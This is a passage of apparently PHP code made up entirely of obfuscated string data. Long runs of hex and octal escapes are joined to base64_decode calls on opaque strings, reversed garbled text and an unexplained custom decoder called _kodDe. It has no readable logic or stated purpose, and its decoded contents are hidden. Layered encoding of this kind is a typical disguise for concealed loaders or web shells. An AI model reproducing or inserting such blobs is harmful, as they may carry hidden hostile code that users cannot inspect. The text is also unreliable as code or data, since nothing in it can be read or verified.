de\xfb"."\x4c\x23\x7d\x40\x74\x12\xa7\xed\x4d\x8b\x4\x9d\x1b\x2d\x37\x36\x82\xbf\x85\xe0\x4f\x6\x7f\x9\xf0\x97\x84\x24\x1c\x35\xc0\xbf\xb\xc0\x1f\x48\x69\x1\xd0\x16\x25\x5a\x9e\x1b\x7\x7f\x20\x75\x3e\xf8\x9d\xf\xb1\x52\xe0\x6f"."\56\347\42\235\235\274\140\320\132\217\263\7\64\273\132\341\40\113\47\243\160\241\202\160\267\36\137\113\371\46\75\124\200\136\356\25\231\316\41\71\113\227\114\361\351\43\370\311\250\16\347\35\234\165\174\172"."\xd4\x41\xa3\x3c\x84\x7\x67\x6b\x95\x9a\x70\x5c\x86\x69\x69\xc4\x54\x34\x3c\xf4\x9f\xb1\xc4\x69\xcc\x9a\x35\xc7\xe9\x6a\x6c\x6a\x6e\x69\x9d\x3b\x6f\x3e\xb5\x45\xcf\x17\x73\x8a\x4e\x8f\x4a\xdc\xc8\x13\x5e\xb\xfc\x51\x93\xf4"."\x87\x1f\xc2\x58\x8f\x4b\xb\x6\xb5\x9\xcf\x31\x73\x6b\xc0\x1b\xa9\x2c\x20\xe8\xc0\x18\xa2\xd6\xd0\x98\x32\xd9\x4f\x4f\x16\xe0\x52\x99\x82\x37\x30\x24\x6d\x41\xf7\x20\xa1\x1c\x77\x74\x4\x72\x9b\x28\xa5\x44\xe8\xc\x54\xd0"."\103\41\261\160\206\372\144\237\335\330\234\154\143\377\330\140\124\116\112\33\56\241\256\370\255\33\271\10\332\104\65\240\326\26\322\274\142\21\341\131\34\100\4\206\27\337\22\12\47\273\260\104\241\154\341\64"."\x11\xc5\xe1\x3b\x41\x54\x20\xc2\x80\x6c\x9c\xfa\x34\x17\xd3\x4\xf0\x62\x17\x10\xa2\x52\x2e\xff\x8a\x40\x8f\xcb\xb\x9f\xf9\x9\x17\x98\x29\xb0\x11\x5a\x42\x34\x31\x59\x0\x55\xde\x5\xb7\x6b\x79\x25\x4b\x2f\x39\xe1\xfd\x56"."\210\255\161\240\111\216\265\5\45\355\50\344\323\216\264\232\162\304\163\5\207\251\246\122\360\37\7\30\103\107\41\221\164\30\245\264\103\111\311\145\307\204\22\57\120\27\307\172\263\103\321\123\216\261\144\302"."\x91\x4c\xe8\x8e\x24\x28\x20\xaf\x4f\x38\xf2\x4a\xca\xa1\x1\xb8\x3e\xd1\xec\x28\x80\xb0\x1\x60\x32\xf8\x33\x74\xe2\x96\xa1\xa4\x26\x15\xd\x6c\x8a\xc\x2d\x5b\x44\x3a\x47\xe5\x29\xe0\x93\x54\xc\xa2\x90\x15\x96\x5e\x8\xf4"."\370\32\135\53\102\54\265\354\230\42\301\136\314\312\157\55\146\322\122\314\112\173\61\142\242\217\372\246\136\214\207\204\306\361\313\105\162\26\372\272\46\377\225\163\5\27\374\103\142\204\2\21\35\150\314\27"."\x43\x23\x7e\x41\x69\xc0\x45\x11\xd1\x5d\xc8\x24\x17\x46\x34\x5d\x5\xe2\xb2\x5c\xbd\x22\x41\x7b\xa2\xa1\xa5\xcc\x9\xa6\xbd\x24\xa2\x86\x49\x8a\x50\x37\x52\x11\x96\x42\xe2\x46\x25\xa6\xa5\x15\x9a\x1e\x61\x4f\x7c\xc4\x55\x73"."\x10\x6c\xa0\x65\xae\xce\x87\x47\x13\xc0\x8d\x58\x1\xda\x29\xa\x49\x10\x8\xb0\x7\xd5\x32\x35\x29\x5e\xec\xc2\xb7\xa6\x1c\xbf\x0\x13\x1d\xc\xae\xcb\x13\xb6\x34\x42\x84\xb6\x49\x50\x7d\x82\x80\x72\xe0\xec\xa0\x85\xc1\x13".base64_decode('zRg80BRattgV6PWFXKg8ZNLGvw2vAnXRYh1/lAnYDDGd1eJyNobL4DdKch5wFfaO5GIXjoPSXNY=')."\224\64\325\24\312\152\371\264\152\26\223\326\66\55\31\14\243\252\24\101\6\227\15\45\13\312\373\17\31\54\30\162\366\77\341\133\61\222\112\111\115\50\375\362\130\25\202\202\120\112\62\71\206\201\163\160"."\x1e\x6f\xc9\x1\x4f\x45\x58\x16\xfe\x12\xd\x62\xbe\x3e\x76\xa4\x27\x66\x9\xd0\x24\x78\x8e\xd\xba\x8e\xe6\x46\x59\x92\x1c\x2e\x14\xe4\x11\x58\xa8\x58\x14\x66\xad\xb4\x0\x91\xd1\x26\x0\x67\xa4\xb6\x81\x1e\x40\x68\x50\x35"."\xa6\x47\xdc\x79\x90\x62\xbc\xc1\xfe\xc1\xa1\x88\xdf\xe7\xaa\x8a\x44\x81\xc2\xcd\x83\x48\x95\x55\x92\xe1\x31\x32\xd8\xae\xa3\x83\xc4\x29\x72\x4d\x81\x82\x54\xa5\x40\x61\xfc\xe8\x53\xcc\x54\x99\xda\x3\x95\xe4\x45\x4d\x3b\x11"."\xbd\x22\x51\x0\x4\xf2\x2d\x73\x73\xb9\x1e\x35\x5b\x65\x21\xfa\x16\x34\x90\x54\x34\x7c\xa0\x83\xe5\xbc\x6d\x86\xb2\x3e\xac\x82\x12\x8\x7\x51\x43\xc1\x2a\xc5\xdf\x9\x15\xbf\x58\x15\x61\x38\xa3\x9a\x4a\xb7\x9c\xad\xf8\x14"."\xca\x52\x99\x4a\x7b\x87\x6b\xc4\x55\xeb\x3b\x9e\x4a\x21\xdd\xaa\x6c\x4c\x31\x4a\x15\x28\xfe\xe5\xc2\x42\x4c\x82\x72\xc2\x21\x27\x4d\xc3\x21\x17\x1d\x72\x4e\x77\xc8\x25\xdd\x11\xd7\xf2\x63\x8e\xa4\x91\x2\x7f\x86\x3\x2c\xbd".base64_decode('MDmVBYhZ2ZEFDMyRU5OqIwcCquko5xxGS44swrkCSCy0OLSU7tDHQJFGBs6NMceEXHJM5GRHrlU=')."\166\150\351\264\243\64\236\162\114\224\34\45\55\341\60\351\331\57\25\223\142\206\250\176\67\136\124\23\143\20\354\202\377\200\161\311\25\214\130\61\257\226\251\47\350\234\246\225\244\134\51\223\374\117\370\330"."\137\263\35\37\13\45\200\357\351\232\61\46\273\220\32\220\242\333\227\43\226\76\102\20\66\100\75\71\60\332\162\241\340\0\2\115\22\154\73\221\155\347\250\75\47\257\317\10\133\5\251\256\121\14\112\152"."\142\16\134\31\372\11\54\47\10\32\24\60\21\257\134\61\335\162\374\315\234\141\300\343\24\121\104\45\42\27\50\216\272\161\301\53\243\240\350\216\121\246\132\31\355\237\267\200\106\200\274\135\152\332\0\377"."\155\336\40\3\336\132\322\364\270\152\320\347\172\130\323\107\105\141\363\277\317\44\62\303\377\41\27\227\117\323\112\136\377\237\277\52\144\232\124\250\241\311\177\237\235\347\1\35\105\355\221\377\207\216\202\231"."\142\342\313\131\4\311\160\25\324\4\344\324\256\106\27\277\57\101\142\15\235\173\255\140\226\226\34\251\126\70\325\112\140\232\225\34\71\255\4\146\264\352\320\163\245\270\43\67\126\2\1\50\63\347\300\74".base64_decode('BGEFiITGRIrM3ZZ0s6MlXXDIYOLHVcAB1FLKkTdKDjD7wf8TJigO/OaALJKDEnoOiOolLU7ZDtQ=').strrev('Fa{Eµ¬JNV¬,◊ˇ˛Ë&-P‰a:√ÄŸ_¸òfUºù~%u¬T«;£¿Mw{˙—Ëyiur')."\56\166\221\126\140\51\21\46\70\230\374\311\321\110\146\170\325\222\210\145\65\155\254\130\20\130\1\116\305\273\154\303\65\322\330\264\241\151\324\305\247\367\177\302\304\305\376\47\54\304\30\4\44\336\63\30"."\x1d\xa5\xc7\xbe\xbd\x8a\xe4\x4b\x42\x6\x61\xf\xc9\xf9\x26\xe7\x97\x1b\x44\x7e\xb9\x81\x30\xbb\x51\x8b\xf0\x6b\x27\xe\xc6\x75\x61\x2\xec\x4\x7a\x16\x4a\x7e\x2b\xb8\xee\x88\xe\xf6\x8c\xe2\xbc\xaa\xb2\x7b\x20\x22\x17\x65"."\306\364\35\160\113\105\330\344\373\26\54\33\233\267\60\167\13\213\316\261\305\333\262\23\256\0\243\101\301\341\12\176\256\47\62\52\275\165\102\267\46\134\360\57\346\351\326\100\111\12\362\76\175\20\135\170"."\212\5\264\10\354\320\240\107\20\6\2\235\50\274\300\40\150\117\151\114\102\101\223\5\7\227\364\5\273\75\310\210\77\326\33\244\357\7\167\164\164\242\43\143\366\364\61\240\27\47\370\120\232\75\351\67"."\54\353\120\201\301\21\41\172\151\22\111\225\264\74\273\326\42\347\142\23\30\25\107\6\173\7\143\236\241\110\257\340\10\201\201\6\211\6\16\172\50\31\102\202\241\300\52\17\167\204\24\227\15\172\136\64"."\74\74\354\204\347\355\320\212\43\201\336\130\356\206\211\22\144\204\271\216\232\61\55\231\310\152\305\144\15\57\320\335\344\152\224\132\33\233\244\241\74\325\137\244\333\43\372\160\166\136\163\12\17\337\331\236"."\xce\xb6\x26\x5a\x1e\x77\xa5\x1f\xc7\x49\x60\x2f\x1\xc8\x4a\xd8\x31\x7\x4b\x8a\x2e\xa8\xe2\xd3\x87\x8a\xc9\x6f\x7f\x70\x39\x51\xb1\xf5\x6\x7\xc9\xf9\x41\xff\x52\xa6\x87\xe2\x53\xa\x54\x68\xf6\x56\xbc\x80\x8b\x54\x67\xca"."\271\354\42\246\230\43\234\212\266\373\332\12\272\126\110\251\371\244\4\160\362\106\233\257\243\306\347\131\336\126\323\11\222\344\154\26\246\112\356\316\166\67\107\44\43\66\30\12\16\366\4\230\13\204\101\70"."\4\344\170\214\274\276\115\37\122\47\237\262\50\141\327\200\236\256\341\112\330\65\250\116\65\22\365\243\206\314\132\160\220\171\133\25\355\75\211\42\43\264\333\22\372\1\106\231\351\7\42\20\237\37\132\272"."\xb\xe4\x91\x61\xa7\xe0\x36\x7b\x3\xc\x24\x26\x6f\xbd\xa2\xc9\x1b\xe8\x8\xb8\x3e\xc1\x1b\x72\xd8\xab\xb0\x63\x12\x50\x5d\x8\x4d\x1a\xdc\x35\x96\x74\x96\x2b\xad\x98\xe4\x56\x16\xc1\x61\xed\x92\x6e\xb8\xee\x38\xf1\x8b\xe2"."\232\76\11\63\333\320\252\176\224\152\75\41\53\171\176\307\114\256\256\311\54\27\54\146\271\265\157\234\131\1\200\42\321\175\235\155\240\111\64\334\121\103\114\342\350\274\200\314\260\246\23\363\275\366\160\233"."\x52\x86\x83\xa\x9a\xdc\x19\x44\x8f\xe\xf\x68\x26\x52\x7b\x6a\x77\x8b\x69\x0\x11\x70\xd\x3\x6c\x80\x3b\xd9\x70\x41\xc\xa\x44\xc5\xc1\x56\xa3\xaa\x74\x5a\x89\x16\xbf\x6d\xcf\x9e\x8a\xe6\x14\x5b\x34\x53\x84\x60\x97\xcb"."\372\144\233\124\345\311\351\154\125\5\156\23\225\110\230\130\177\244\352\244\205\366\74\240\152\35\13\346\265\66\66\72\252\76\173\17\73\112\42\347\207\375\141\47\236\330\316\345\52\340\7\76\152\31\214\136"."\xfe\x6e\x93\xc8\x44\x70\x48\x74\x7e\xe0\xd0\xa0\x27\xe2\xed\x75\x48\x88\x58\x1d\xd2\x12\x7f\x4\x80\x87\xc0\x3f\x58\x7d\xde\x21\xc1\x79\xd\x92\xc1\x3c\x77\x48\xd0\x2e\xd7\x21\xd\xd\xe0\x5f\xae\xfa\xc\xfa\xe\x93\x5\x32"."\134\101\135\11\342\220\242\51\321\270\111\224\44\301\31\13\325\143\110\257\143\0\35\321\134\333\260\232\157\151\206\232\317\330\64\7\356\323\11\61\0\356\130\324\363\155\330\217\217\341\314\251\11\260\252\203"."\x15\xd5\x9\x48\xa2\xd\xea\xe0\x59\xcb\xa0\x17\x99\xff\xff\x12\x60\x2d\xa8\xfa\xf5\xff\xbf\x14\xa8\x32\xe1\x31\xc1\x22\x13\x2f\x9a\x8a\xf1\x3f\x95\x41\x19\x1c\xeb\x2a\xac\x56\xd4\x49\x56\x85\x26\xa9\xb9\xb1\x51\xa\x2e\x85"._kodDe('MhBUW1EDDVDZ967k3EF8lwYQU/7RT2nvIIUTU4atmzIP8vEQKqYoRZpvg3F0f0cRcpMVjxIh+X+z')."\160\223\1\362\116\262\166\300\265\275\4\75\221\217\321\316\302\230\230\225\45\333\320\127\60\27\143\140\13\42\50\20\143\202\111\236\55\32\240\60\216\215\323\30\172\22\256\103\235\152\36\76\114\152\42\336".base64_decode('hiEMAbrRppMe5oe2a24EdHPGDPNhRJaP+InsDOCiFYhCYdZWQUulTjortII8XlQYvM02S1ibUSY=')."\106\6\266\36\243\130\226\256\145\344\202\213\204\157\203\71\43\350\33\234\1\345\361\12\321\46\101\367\276\116\300\117\112\25\54\271\202\26\340\200\116\311\23\247\134\304\277\165\145\305\132\270\164\141\105\304".strrev('ìd–É†0%¬J4°§¬)ñÑæVƒ<∑!9Äi;‘5€_Œÿ’Ó∞F-\'ÿlïÇIQ‘r˛ú+ÉÜ').strrev('…AXÂ H'."\0".'l1Í±u≥ÖìJÜFkr„1rÌÇä≤æ}'."\n".'Ûïê¨ioöI˚B¡êG'."\n".'Tµ±L–')."\342\303\22\144\232\105\341\223\123\300\23\131\35\172\12\113\212\161\65\7\257\30\145\126\111\35\210\354\200\33\215\121\234\264\256\50\171\13\44\236\55\52\26\200\234\55\144\144\4\301\0\362\340\200\67\356".base64_decode('9qbdXt3tJVvtnfHPLiSZrFrEBxJ9pgA1EO+koXeWtJqqCodXc1UTClSqm+AaOxlBl0ZAh5fV6E4=')."\x42\x48\x9\x69\x26\x5b\x5b\xb9\xbd\xc\x4a\x4a\x65\xa9\x9a\x57\xa0\x7f\x49\xac\xa7\x2f\x30\x18\x43\x22\x7e\x70\x20\xe2\xe9\xb3\x25\x0\x9e\x19\x9\x78\x2b\xc0\xdd\x41\xea\xb1\xd5\x56\xeb\x78\xce\xaa\x86\xa6\xe6\xd1\x32\x3f"."\310\375\314\240\67\352\231\307\122\342\366\217\344\201\72\375\70\270\250\75\256\273\251\351\137\134\330\360\30\71\71\313\24\232\334\124\317\334\115\375\371\123\127\44\175\1\62\167\334\144\177\327\247\306\311\60"."\17\172\373\126\201\46\100\217\21\301\220\47\264\222\273\254\5\51\21\117\150\212\24\230\207\70\174\243\76\310\26\55\136\274\230\276\70\231\310\142\133\101\250\333\317\356\313\1\24\236\76\51\225\120\271\22"."\x13\xaa\xe5\x21\x3b\x1e\xcb\x7d\x7b\x48\xd6\x3d\xb8\x5\x55\x12\x57\xa9\x85\x29\x12\xd5\x2\x7d\x2f\xb0\x40\xd5\xcb\xb\xf4\xa9\x9\x93\x1d\xa7\x9\xfe\x61\xe6\x93\x5f\xfa\x68\x40\x7c\x1d\x21\x6b\x59\x27\xba\x3\x9\x99\xe4"._kodDe('KwBKMWVRiUj6W9KfC0wngXGHfDp0ohiij5goMxMXTjbolTZNb/pNgU0JMM8OeJ5EhMylRwsWbEDI').strrev(''."\0".'ƒ¶‘ì/!"±3ˇMƒ¢.\\ÿÏ@·˜?m‡çjB'."\r".'>êTÃÄ◊’"‡!ã¡ø©—§Åæ…4d').base64_decode('nxOcEUJJSYJLCzJfsPhNWaolybC1YWcpSaW8SEKegIjf6erOd9BnJPAZaKolYYtTi4IgRqiAtFk=')."\364\14\161\102\145\205\147\67\66\65\12\246\30\1\257\77\34\73\52\14\375\132\366\5\250\37\26\153\102\0\244\105\102\123\244\170\102\123\245\4\273\217\232\42\305\113\367\17\326\224\276\140\60\54\272\374"."\261\125\157\150\120\160\346\107\366\307\160\355\246\257\34\14\14\365\21\376\25\45\24\34\45\274\330\113\324\233\242\305\331\215\255\324\112\207\277\240\10\373\46\46\274\163\214\217\314\160\130\103\73\64\34\226"."\x12\x32\xb6\x66\x89\x2b\x58\x2a\x50\x92\xd0\x91\x27\xac\x9d\x64\x0\x59\x99\x72\xf2\x99\xd0\x4b\xaf\xdb\x5d\xe7\x9a\x53\x3f\x6b\x66\x4e\x84\x45\x1b\x20\x30\xda\xe0\x9e\x39\x44\xaa\x31\x93\xc3\x0\xc2\x2c\x6\x77\xaf\xae\xab"."\xd9\x50\x5b\xef\x6a\xa8\x8b\x36\xd5\x33\xf5\xad\x28\x35\x1\x8b\x46\x8b\x44\xf9\x69\x74\x7d\xeb\x46\xee\x33\x30\x3a\xe2\x6a\x88\x8e\xce\x12\xb4\xc9\xd6\x3\xc0\x46\x6\x98\xc8\xd0\xf3\x30\xe4\x8a\x81\x61\x19\xd\x75\x23\x35".strrev('S˙”Í!d$ªEëCÓÅX©À§8îÒÛÿ¯àjê˜,◊GzÜÆ√GÑX÷(Ë—’ëÜÆ£µ')."\26\374\252\305\344\224\105\27\335\314\25\4\62\206\256\300\346\265\212\32\346\30\102\227\230\42\135\13\121\220\132\141\25\270\246\275\125\271\226\105\55\263\247\121\352\6\242\233\305\334\327\342\14\116\250\255".base64_decode('PkcoKCa6QEQQ8YULGBce8BTqCuQ3wWsJLIh69SGCgWxkpnBzgz1OgAYIdUKsxgUPAISFt9fmrok=').base64_decode('bKsq+xCHAWGTqYbwwKfQPoc64uCK4xNx0gOwj2O2DzKr4aywPeU6MUi64FpZNEpFpoRcgPc3SXw=')._kodDe('Mfs/iyeIaXNyjvMhgAa14U9COfLt7/NdnoJND6zn7prh74vsw201MHdp73UNf+nNRvAw9Diwbz3C').strrev('$◊qÒˇ∫%2vP˜'."\0".'2°Ã…Ìï_Ãvõ8ÊñâËOj’›±ÇÿÕ‚£ÿLHÅûºí∂\\É˝#').base64_decode('GzqIJVVAjkxIBvFUR0x2SFXPdNgGS5fzRkrRbceVcTUvU6+kOfrtHDNrg96MqAcYZIJGJQXxLrs=')."\xc0\x2e\x4\x89\xdd\x97\xe\x52\xf5\x24\x34\x52\x12\xce\xf0\xf2\x66\x48\x49\x8b\xd1\x3e\x8d\xe9\xf0\xa1\xd5\xbd\x4a\x11\xf0\x15\x19\xc1\xd6\x4\x6e\x5a\x3c\x9\xb3\x28\xbe\x56\x23\xbc\xd8\xd\x62\xc2\xeb\xe9\x82\xbd\x9d\xb3"."\x49\x62\x2d\x8a\xe1\x92\x71\x64\x8e\x90\x80\x35\xc7\xab\xd8\xec\xd9\x8c\xf9\x91\x11\x2c\x9e\xbc\xd0\x49\x6e\x3e\x5c\x8c\x33\x47\x2d\x36\x23\x3b\xea\xfa\x53\x12\xcd\xdb\xa8\x73\x4f\x58\x0\x7a\x60\x5\xb6\xc0\x10\xd3\x40\xb1".base64_decode('8MFe3jIxC/pmRRacBq3QOCsTUwyooDVExbBqKVU+hZKEHk3QfR1ZmkgnruR9ZdL+bnbS17s00WU=')."\x1b\xb6\x61\x23\x9d\xeb\x6c\x96\x4\xf2\x82\xbc\x47\xa0\x8\x7c\x3a\xc1\xba\x91\x5b\x65\x66\x39\x8e\x6\x9d\x10\x8\xa6\x4a\xdc\xea\xf\x3f\xd\xc3\x86\x16\xbd\x21\xc3\x62\xba\x60\x11\xa6\x24\xe9\xd0\xa1\x37\x58\xaa\xae\x25"."\30\210\36\151\251\152\63\205\73\13\46\373\54\56\40\155\10\140\312\133\323\311\273\353\102\145\254\31\164\354\22\117\174\125\36\145\341\165\346\236\63\1\110\303\57\271\13\235\300\35\253\341\7\146\250\303"."\117\117\62\151\7\107\64\6\254\164\316\346\142\256\112\211\253\164\260\41\15\7\202\3\165\365\120\302\262\330\362\367\117\62\147\326\140\324\320\232\335\57\227\371\240\260\10\115\145\64\151\130\42\330\325\240"."\x25\x37\x3\x31\xac\x9\x25\xce\x58\x34\x61\x9a\xbd\x83\x6e\x6\xea\xa6\xdd\xc4\x5e\x33\x21\xd6\xcd\xd0\x73\xbc\x58\x68\x90\xc8\xab\x13\xd8\x24\x8a\xf0\xcd\x36\xe6\x7d\x91\x6e\x87\x26\x72\x6a\x42\xea\xb\x2e\x81\x7b\x71\x5f"."\40\274\124\112\53\246\304\205\36\164\151\141\235\345\310\21\3\72\344\243\104\36\247\52\55\50\350\104\7\42\116\213\377\33\266\103\21\335\62\302\202\52\12\306\243\56\26\7\117\123\234\111\146\355\152\303".strrev('Ä@E5˙+ÒöÆ” |®jí˘®2K?,¸ÔïbÌ˛®º'."\n".'ì9k{&Ú±√∏B˚ÒEBB•').base64_decode('3rC4CTjrVvadCtNkHsc45KEqwQgWD4n4PpuwGkAHBGCp5bpvBeoPhVy3U9ogUeHm2vKQG0kGO0M=')."\131\245\244\216\303\102\216\120\140\111\157\144\252\342\52\260\325\44\177\245\315\126\31\65\111\245\105\346\347\31\310\210\250\74\254\305\143\251\23\124\124\340\274\43\340\163\240\367\265\270\223\121\24\4\362\244"."\3\36\167\241\12\70\370\225\175\14\135\32\223\151\245\152\310\22\225\230\163\142\130\40\30\103\102\51\211\272\355\42\162\12\331\212\42\153\43\301\333\216\233\36\101\62\17\321\360\44\332\137\46\125\167\231".base64_decode('NATB3PgUZqSPTdHK4qjdZ2rGIiNX4oI0idvIMwSpQ2pErhawfg2672mn3uBh47HdMnpwy58r0Ac=')."\x3c\xb1\x4d\x73\xaf\x6a\xf0\x57\x1d\x90\x98\xc0\xb7\x43\x50\xf6\xd2\x72\x93\x15\x0\x8b\xd1\x7c\x1f\xad\x6\x73\xeb\x9\xcd\x4a\xf2\x29\x4d\x6c\x19\x62\x59\x7e\xc0\x1a\x1c\x28\x84\x6d\xa5\x1d\xf0\xe4\xda\x1c\x44\x44\xd0\xa7"."\224\24\153\366\51\313\62\354\274\236\361\151\13\143\104\21\201\216\220\221\252\340\25\235\376\102\167\64\114\276\204\125\21\4\21\142\305\24\45\277\224\7\332\213\6\143\343\45\132\42\224\0\141\264\42\261".base64_decode('X+FqaaSuDs7W8e00AAE2gCxzBIqmacLwY/X0EHYi6MIeLKjckVaZp1ALGiF3sEWY0tcKWd+w35U=')."\142\76\200\175\303\133\240\272\40\136\213\16\146\261\207\31\356\303\233\240\203\257\15\142\227\62\144\102\212\105\122\317\75\350\7\12\340\200\136\231\255\263\273\322\323\17\164\162\310\304\7\356\24\164\114\103"."\122\254\113\224\177\11\202\324\56\321\371\142\230\26\72\202\42\7\220\106\34\50\200\210\123\24\222\252\103\55\304\211\120\330\200\241\167\0\331\330\301\36\45\77\76\45\305\304\107\30\347\373\14\361\365\13"."\332\4\114\30\25\337\100\277\160\23\355\300\155\164\60\162\121\215\76\244\156\150\204\261\200\345\340\156\330\35\370\254\36\31\265\160\346\300\273\203\222\175\132\341\37\204\65\214\210\37\267\110\162\166\41\216"."\xf5\x92\x2d\x43\xc8\xde\x93\x11\xad\xd2\x41\x2\x77\x6d\x94\x2f\xe6\xb8\xf\x29\x10\xb1\xa\xb0\x58\xb4\xa7\xae\x25\xbe\xa5\xb9\x45\x3d\xeb\x40\xaa\xb2\xe\xfa\x4a\x9c\x3\xbf\x15\xea\xb0\x14\x81\x2a\x14\x33\x85\x6\x33\x69".base64_decode('yjZcFR/7L0onLmSRQAtEA+xxAie1oYuO6miqhS7B7pEfIeOXJgt2Rrkyl2xumbtQ3C/yYeSObMg=')."\xd1\x3e\xd1\xfa\xa1\x47\x63\x8c\x30\x24\x2b\x9d\x49\xf4\x79\x4b\x71\x66\xa3\x44\xab\x27\x5c\xf2\xe6\xa8\xc0\x5\x6d\xfc\xeb\xbf\x9a\xe\x9e\x6a\xe2\x26\xce\x24\x9c\x60\xb1\x92\x85\x2e\xa8\xf6\x95\xff\x7f\x3d\xac\x1e\xcd\xc8"."\76\320\307\144\114\101\60\24\105\130\136\173\374\24\343\177\377\175\52\260\311\126\237\126\50\325\72\365\205\143\7\305\14\102\303\167\62\46\202\264\317\337\121\22\326\67\130\226\107\24\141\53\105\160\72\163".base64_decode('uM4TcvzO3WYgIrEQjPBuqehHHRUUQY2cqmi0ByT1JRSDLs+REzjPEuYaH14s8irAGGcTpsZTTME=')."\x69\x3b\x64\x2c\x41\x7a\x6a\x6\x36\x91\x16\x91\x12\xc4\xb9\x15\x92\x40\xf7\x49\x1b\x50\x94\x1\x84\x79\x4\xe8\x5b\x15\xc4\x42\x22\x2f\x71\x1\x4\x35\x54\x70\xec\x43\xb6\xa9\xbc\xa7\x3c\x64\xc2\x24\x1d\xe2\x6b\xad\x20\xca"."\10\205\160\164\62\363\220\227\134\374\131\201\177\163\126\315\103\3\124\121\37\106\204\3\31\44\306\261\304\214\50\341\301\127\200\254\102\15\253\5\342\62\325\150\26\127\2\22\42\131\104\120\220\162\66\250".base64_decode('yYsMaGEe0nvWmYoa9C0rESyOeWkmEdFnvLDSicx0LzGVUJbDEiMRLmIhvWjhjgfFmfNN+qQTfek=')."\x49\x66\x5e\x5c\xa0\x7b\x1a\xb6\xaf\xc1\x67\x3e\x4\x25\x9b\xe5\x8c\x5b\x7c\xc2\x23\x1b\x97\x75\x17\xa0\xb0\x31\x93\xba\xf4\xaa\x16\x11\x5b\x59\x45\x1c\xa7\x22\x1\x6f\x40\x5e\x4d\x8c\x55\x71\xe1\x3\xfb\x1f\xea\xcc\x8\x3c"."\123\130\151\52\320\70\117\1\13\22\323\165\243\41\44\273\102\31\205\74\122\155\171\67\41\310\356\200\353\211\373\267\321\305\224\41\300\131\110\17\223\104\136\140\1\125\160\220\210\205\171\133\200\125\210\0".base64_decode('Okan9GDJAZ0FdQtCcKXHpsrUUCUPY9NQxON8HsdjoG7WDaX4NXxVCzdNIbi/cdmKZ/Om6lxRDXw=')."\xc\x27\xca\xfe\x20\x24\xd6\x9d\x4e\xb6\x41\x5d\x43\x2b\xb0\x15\xca\x76\x61\x82\xc9\x90\xa0\xce\x13\xb6\xb3\x2b\x53\xb3\xf4\x2\x10\x98\x85\x23\x72\xfc\xc\x22\x7e\xae\x1a\xbe\xe1\x6\x98\x96\x14\x1e\xea\xaf\x43\x4e\xad\x21".strrev('	hjŒÛ•kòt?\'’Ω'."\r".'ç§3√boâÅ‚^∂‰'."\0".'¿§k!aìV®?¯Ioi¡!≠iOAŒπ'."\0".'')."\115\67\4\64\341\75\241\145\320\273\70\16\366\253\171\372\24\4\41\137\232\235\164\275\370\270\274\265\174\60\322\141\323\62\46\374\115\160\373\133\340\150\213\205\167\115\226\315\23\121\233\21\101\302\61\17"."\xd4\xd\xb7\xfa\x4b\x45\x89\x8\x4c\xdf\x4a\x24\x25\x8\x67\xd5\xd6\x5b\x3\xf6\x18\x74\x5\x6f\x2a\xaa\x7d\x42\x32\xca\x45\x9f\xe8\x2\xbf\xd0\x5d\x7f\x80\x3b\x4f\x40\xc9\xf8\x74\xcd\x53\x92\x99\x4a\x89\x3d\xd7\x90\x45\x2"."\25\356\30\22\210\2\371\66\1\145\214\203\132\242\177\74\5\325\236\303\314\250\172\262\133\315\47\355\370\305\174\234\101\71\72\30\214\356\152\140\40\43\161\366\154\203\13\53\11\147\220\162\211\237\101\163"."\x99\x30\x99\xec\x91\x4b\x55\x50\x99\xa9\x33\x83\x2\x8\x43\x45\x2\x8f\xf0\xaa\x8\x77\xb4\xab\x4c\x88\x5f\x27\x78\xa9\xca\x75\x4\x22\x56\x42\xf9\xab\x23\xf6\x76\xa1\x79\xc3\xe0\xe4\xd8\x3f\x2f\x78\x41\x23\xe4\xc6\x41\xf8"."\261\170\346\346\16\27\245\153\50\243\234\344\376\357\160\35\331\366\215\177\322\372\70\12\103\143\302\30\300\101\112\343\116\13\324\346\353\27\236\144\321\25\325\226\104\366\216\102\361\125\267\230\26\122\350\23".strrev('å$÷<”Ñæt9Åä¥Á–H‹>—T¥LHf	cY`¿à≥L≈”#î,l;Ó€.÷ØN˛ÆÃ¶oä')."\257\330\132\44\146\260\267\26\347\320\53\372\214\344\251\376\151\373\7\150\227\331\357\375\170\41\302\151\133\305\245\144\104\253\222\7\327\250\152\66\234\4\163\162\151\315\222\127\334\323\362\154\0\132\64\246"."\250\141\145\373\321\354\260\265\236\324\231\373\331\26\120\247\352\222\252\310\225\237\43\343\157\307\106\373\324\352\265\250\272\247\236\252\26\125\221\247\254\5\307\266\135\41\126\143\163\64\245\12\143\343\67\176"."\225\54\224\247\125\271\177\304\145\302\365\65\144\121\317\253\110\26\57\63\253\137\167\206\252\116\104\303\172\17\151\203\213\35\103\25\53\266\235\364\343\355\367\237\35\30\224\150\100\4\133\30\157\61\77\226"."\247\36\214\300\27\270\147\100\150\245\350\321\355\375\107\305\70\233\223\134\112\236\371\242\340\230\265\252\227\135\7\334\341\126\156\41\263\324\277\225\350\203\30\357\63\64\123\115\10\152\20\20\50\272\321\305"."\351\364\43\131\176\22\105\144\0\174\273\345\23\265\174\121\155\125\370\346\71\273\101\264\134\227\125\111\167\361\223\111\213\223\146\364\166\26\263\334\306\213\62\71\233\305\67\11\110\143\205\100\272\47\341\66"."\311\201\327\72\234\34\326\164\23\132\164\3\176\134\100\277\335\232\151\122\66\1\44\133\204\211\104\67\344\60\106\270\37\5\41\376\70\51\354\133\164\54\214\10\25\61\24\24\44\167\32\160\113\31\126\160".base64_decode('KmJSlgg8bmaRUOW5ck/RdonCAWAzGNfKhAjQsye8PvBcmHSLXTzjjv4JFYq3vUjFynDjFDdRz3Y=').strrev('Ωj·.Qí+<Uá»`··¬z'."\r".'$W	 Eπn¯£0¿ã∆år≠ø\'.bƒ—\'≤Eé¶<m‰ú2¢')."\42\151\260\67\70\60\125\232\277\337\23\350\253\110\203\127\355\120\361\224\76\337\210\223\2\203\250\226\236\276\76\252\327\125\131\213\200\167\51\257\11\272\141\342\347\241\205\214\106\217\27\155\72\47\364\370"."\70\54\323\151\2\231\77\333\320\12\141\45\307\16\237\204\342\254\247\0\342\220\33\364\171\121\26\50\124\354\40\204\205\36\136\215\17\220\302\102\324\263\42\174\313\232\115\177\46\315\242\306\331\165\154\124".base64_decode('YU7guzWX5Q5OgKNJhBiSQJzieowARF/Udgdi61hh7a+8RUMQ3jmwDUdRLwtrtbhwuop5loVbiYo=')."\16\70\154\143\146\311\210\26\221\323\204\307\100\41\203\307\272\47\305\260\170\164\321\311\130\214\51\247\351\125\266\235\55\13\167\267\260\227\376\17\126\157\246\252\332\301\0\0".base64_decode('').base64_decode(''),